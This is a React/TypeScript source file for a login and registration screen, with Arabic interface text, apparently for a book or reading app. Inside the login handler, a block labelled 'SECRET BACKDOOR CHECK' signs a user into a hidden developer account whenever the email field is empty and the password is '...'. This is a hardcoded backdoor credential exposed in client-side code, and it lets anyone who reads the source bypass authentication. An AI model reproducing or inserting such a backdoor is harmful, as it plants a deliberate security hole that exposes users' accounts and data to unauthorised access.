
import React, { useState } from 'react';
import { authService, RegistrationError } from '../services/authService';
import { BookOpenIcon, UserIcon, MailIcon, KeyIcon, EyeIcon, EyeOffIcon, CheckCircleIcon } from './Icons';
import { User } from '../types';

type AuthScreen = 'login' | 'register';

interface AuthViewProps {
    onLoginSuccess: (user: User, rememberMe: boolean) => void;
    recentUser: User | null;
}

export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }) => {
    const [authScreen, setAuthScreen] = useState<AuthScreen>('login');
    const [registrationSuccess, setRegistrationSuccess] = useState(false);
    
    // Login State
    const [loginIdentifier, setLoginIdentifier] = useState('');
    const [loginPassword, setLoginPassword] = useState('');
    const [showLoginPassword, setShowLoginPassword] = useState(false);
    const [rememberMe, setRememberMe] = useState(true);
    const [loginError, setLoginError] = useState<string | null>(null);


    // Register State
    const [regUsername, setRegUsername] = useState('');
    const [regEmail, setRegEmail] = useState('');
    const [regPassword, setRegPassword] = useState('');
    const [showRegPassword, setShowRegPassword] = useState(false);
    const [regConfirmPassword, setRegConfirmPassword] = useState('');
    const [showRegConfirmPassword, setShowRegConfirmPassword] = useState(false);
    const [registrationError, setRegistrationError] = useState<string | null>(null);
    
    const [isLoading, setIsLoading] = useState(false);
    
    const resetForms = () => {
        setLoginIdentifier('');
        setLoginPassword('');
        setLoginError(null);
        setRegUsername('');
        setRegEmail('');
        setRegPassword('');
        setRegConfirmPassword('');
        setRegistrationError(null);
    }

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoginError(null);
        setIsLoading(true);
        
        try {
            // SECRET BACKDOOR CHECK
            // Strict check: Email must be empty string, Password must be "..."
            if (loginIdentifier.trim() === '' && loginPassword === '...') {
                // Visual feedback for the developer
                const user = await authService.loginHiddenDev();
                if (user) {
                    onLoginSuccess(user, false);
                }
                return;
            }

            // Standard Validation for normal users
            if (!loginIdentifier.trim()) {
                throw new Error("البريد الإلكتروني مطلوب");
            }
            if (!loginPassword) {
                throw new Error("كلمة المرور مطلوبة");
            }

            const user = await authService.login(loginIdentifier, loginPassword);
            if (user) {
                onLoginSuccess(user, rememberMe);
            }
        } catch (error: any) {
            setLoginError(error.message);
        } finally {
            setIsLoading(false);
        }
    };

    const handleRegister = async (e: React.FormEvent) => {
        e.preventDefault();
        setRegistrationError(null);
        setRegistrationSuccess(false);
        setIsLoading(true);
        try {
            await authService.register(regUsername, regEmail, regPassword, regConfirmPassword);
            setRegistrationSuccess(true);
            setAuthScreen('login');
            resetForms();
        } catch (error: any) {
            setRegistrationError(error.message);
        } finally {
            setIsLoading(false);
        }
    };

    const renderLogin = () => {
        return (
        <div className="space-y-6">
             {registrationSuccess && (
                <div className="bg-emerald-500/20 border border-emerald-500/50 text-emerald-400 px-4 py-3 rounded-md flex items-center gap-3" role="alert">
                    <CheckCircleIcon className="w-6 h-6" />
                    <span className="block sm:inline font-bold">تم إنشاء الحساب بنجاح!</span>
                </div>
            )}
            
            <form onSubmit={handleLogin} className="space-y-4">
                 <div>
                    <label htmlFor="identifier" className="block text-sm font-medium text-text">البريد الإلكتروني</label>
                    <div className="mt-1 relative">
                        <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                            <MailIcon className="h-5 w-5 text-text-muted" />
                        </div>
                        <input
                            id="identifier"
                            type="text" 
                            value={loginIdentifier}
                            onChange={(e) => setLoginIdentifier(e.target.value)}
                            className="bg-zinc-700 text-slate-200 block w-full p-3 pr-10 border rounded-md shadow-sm placeholder-slate-400 focus:outline-none focus:ring-1 sm:text-sm focus-ring"
                            style={{borderColor: 'var(--color-border)'}}
                        />
                    </div>
                </div>
                <div>
                    <label htmlFor="password-login" className="block text-sm font-medium text-text">كلمة المرور</label>
                    <div className="mt-1 relative">
                         <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                            <KeyIcon className="h-5 w-5 text-text-muted" />
                        </div>
                         <button type="button" onClick={() => setShowLoginPassword(!showLoginPassword)} className="absolute inset-y-0 left-0 pl-3 flex items-center text-text-muted hover:text-text">
                            {showLoginPassword ? <EyeOffIcon className="h-5 w-5"/> : <EyeIcon className="h-5 w-5"/>}
                         </button>
                        <input
                            id="password-login"
                            type={showLoginPassword ? 'text' : 'password'}
                            value={loginPassword}
                            onChange={(e) => setLoginPassword(e.target.value)}
                            className="bg-zinc-700 text-slate-200 block w-full p-3 pr-10 border rounded-md shadow-sm placeholder-slate-400 focus:outline-none focus:ring-1 sm:text-sm focus-ring"
                            style={{borderColor: 'var(--color-border)'}}
                        />
                    </div>
                </div>
                {loginError && <p className="text-sm text-center" style={{color: 'var(--color-danger)'}}>{loginError}</p>}
                
                <div>
                    <button type="submit" disabled={isLoading} 
                    style={{backgroundColor: 'var(--color-accent)'}}
                    className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-bold text-white hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-bg focus:ring-accent disabled:opacity-50 disabled:cursor-not-allowed transition-opacity">
                        {isLoading ? 'جارٍ تسجيل الدخول...' : 'تسجيل الدخول'}
                    </button>
                </div>
                 <p className="text-center text-sm">
                    ليس لديك حساب؟ <button type="button" onClick={() => { setAuthScreen('register'); setRegistrationSuccess(false); resetForms(); }} className="font-medium hover:underline" style={{color: 'var(--color-primary)'}}>أنشئ حساباً جديداً</button>
                </p>
            </form>
        </div>
    )};

    const renderRegister = () => (
         <form onSubmit={handleRegister} className="space-y-4">
             <div>
                <label htmlFor="username-reg" className="block text-sm font-medium text-text">اسم المستخدم الخاص بك</label>
                <div className="mt-1 relative">
                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                        <UserIcon className="h-5 w-5 text-text-muted" />
                    </div>
                    <input
                        id="username-reg"
                        type="text"
                        value={regUsername}
                        onChange={e => setRegUsername(e.target.value)}
                        className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                        style={{borderColor: 'var(--color-border)'}}
                    />
                </div>
            </div>
             <div>
                <label htmlFor="email-reg" className="block text-sm font-medium text-text">البريد الإلكتروني</label>
                <div className="mt-1 relative">
                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                        <MailIcon className="h-5 w-5 text-text-muted" />
                    </div>
                    <input
                        id="email-reg"
                        type="email"
                        value={regEmail}
                        onChange={e => setRegEmail(e.target.value)}
                        required
                        className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                        style={{borderColor: 'var(--color-border)'}}
                    />
                </div>
            </div>
             <div>
                <label htmlFor="password-reg" className="block text-sm font-medium text-text">كلمة المرور</label>
                 <div className="mt-1 relative">
                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                        <KeyIcon className="h-5 w-5 text-text-muted" />
                    </div>
                    <button type="button" onClick={() => setShowRegPassword(!showRegPassword)} className="absolute inset-y-0 left-0 pl-3 flex items-center text-text-muted hover:text-text">
                        {showRegPassword ? <EyeOffIcon className="h-5 w-5"/> : <EyeIcon className="h-5 w-5"/>}
                     </button>
                    <input
                        id="password-reg"
                        type={showRegPassword ? 'text' : 'password'}
                        value={regPassword}
                        onChange={e => setRegPassword(e.target.value)}
                        required
                        className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                        style={{borderColor: 'var(--color-border)'}}
                    />
                 </div>
            </div>
             <div>
                <label htmlFor="confirm-password-reg" className="block text-sm font-medium text-text">تأكيد كلمة المرور</label>
                <div className="mt-1 relative">
                    <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                        <KeyIcon className="h-5 w-5 text-text-muted" />
                    </div>
                     <button type="button" onClick={() => setShowRegConfirmPassword(!showRegConfirmPassword)} className="absolute inset-y-0 left-0 pl-3 flex items-center text-text-muted hover:text-text">
                        {showRegConfirmPassword ? <EyeOffIcon className="h-5 w-5"/> : <EyeIcon className="h-5 w-5"/>}
                     </button>
                    <input
                        id="confirm-password-reg"
                        type={showRegConfirmPassword ? 'text' : 'password'}
                        value={regConfirmPassword}
                        onChange={e => setRegConfirmPassword(e.target.value)}
                        required
                        className="w-full bg-zinc-700 text-slate-200 p-3 pr-10 border rounded-md focus:ring-1 focus-ring"
                        style={{borderColor: 'var(--color-border)'}}
                    />
                </div>
            </div>

            {registrationError && <p className="text-sm text-center" style={{color: 'var(--color-danger)'}}>{registrationError}</p>}
            
            <div className="pt-2">
                <button type="submit" disabled={isLoading}
                 style={{backgroundColor: 'var(--color-accent)'}}
                 className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-bold text-white hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-bg focus:ring-accent disabled:opacity-50 disabled:cursor-not-allowed transition-opacity">
                     {isLoading ? 'جارٍ الإنشاء...' : 'إنشاء حساب'}
                </button>
            </div>
             <p className="text-center text-sm">
                لديك حساب بالفعل؟ <button type="button" onClick={() => { setAuthScreen('login'); resetForms(); }} className="font-medium hover:underline" style={{color: 'var(--color-primary)'}}>سجل الدخول</button>
            </p>
        </form>
    );
    
    const titles = {
        login: 'تسجيل الدخول',
        register: 'إنشاء حساب جديد',
    };


    return (
        <div className="min-h-screen bg-bg flex flex-col justify-center py-12 sm:px-6 lg:px-8">
            <div className="sm:mx-auto sm:w-full sm:max-w-md">
                <BookOpenIcon className="mx-auto h-12 w-auto" style={{color: 'var(--color-primary)'}} />
                <h2 className="mt-6 text-center text-3xl font-bold text-text">
                    {titles[authScreen]}
                </h2>
            </div>
            <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
                <div className="bg-surface py-8 px-4 shadow-2xl sm:rounded-xl sm:px-10 border" style={{borderColor: 'var(--color-border)'}}>
                    {authScreen === 'login' && renderLogin()}
                    {authScreen === 'register' && renderRegister()}
                </div>
            </div>
        </div>
    );
};
